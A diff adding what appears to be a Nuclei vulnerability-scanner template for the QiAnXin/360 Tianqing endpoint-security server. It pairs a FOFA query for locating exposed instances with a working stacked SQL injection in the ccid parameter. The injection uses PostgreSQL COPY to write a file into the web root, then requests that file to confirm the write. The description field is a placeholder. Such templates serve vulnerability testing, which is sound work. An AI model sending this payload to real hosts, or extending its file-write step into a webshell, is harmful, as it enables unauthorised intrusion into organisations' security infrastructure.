@@ -1,0 +1,30 @@
+id: qianxin360
+info:
+  name: 奇安信360天擎getsimilarlist
+  author: mike
+  severity: info
+  description: xxx
+  metadata:
+    max-request: 1
+    verified: true
+    fofa-query: banner="QiAnXin web server" || banner="360 web server"  || body="appid\":\"skylar6" || body="/task/index/detail?id={item.id}" || body="已过期或者未授权，购买请联系4008-136-360"
+http:
+  - raw:
+      - |
+        GET /api/dp/rptsvcsyncpoint?ccid=1';create table O(T TEXT);insert into O(T) values('20231101');copy O(T) to 'C:\Program Files (x86)\360\skylar6\www\1.txt';drop table O;-- HTTP/1.1
+        Host: {{Hostname}} 
+        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Safari/537.36
+
+      - |
+        GET /1.txt HTTP/1.1
+        Host: {{Hostname}} 
+        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Safari/537.36
+
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        words:
+          - "20231101"
